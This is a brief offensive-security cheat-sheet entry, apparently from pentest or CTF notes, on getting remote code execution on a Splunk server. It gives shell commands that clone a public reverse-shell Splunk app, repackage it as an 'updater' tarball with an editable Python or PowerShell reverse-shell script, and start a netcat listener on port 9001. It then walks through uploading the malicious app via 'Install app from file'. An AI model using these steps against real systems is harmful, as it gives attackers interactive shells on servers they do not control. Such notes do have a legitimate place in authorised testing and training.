# RCE

Create  a malicious splunk app to upload

```sh
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
mkdir updater
cp -r reverse_shell_splunk/reverse_shell_splunk/bin reverse_shell_splunk/reverse_shell_splunk/default ./updater
# Edit this revshell script if the target is linux
vim ./updater/bin/rev.py
# Edit the .ps1 if the target is windows
vim ./updater/bin/run.ps1
tar -czvf updater.tar.gz updater
```

```sh
nc -nvlp 9001
```

## Navigate gui to upload app

On home page, click on `Splunk Apps`

![](/images/99130733b4aadae28207961d883da6a0.png)

Then on top "kinda" left, `Apps` -> `Manage Apps`

![](/images/1530e4cdeb3b75620305e67223566947.png)

Finally, `Install app from file` and upload your own malicious tarball

![](/images/f43f88a18a2fce356c4fdb79b7775e35.png)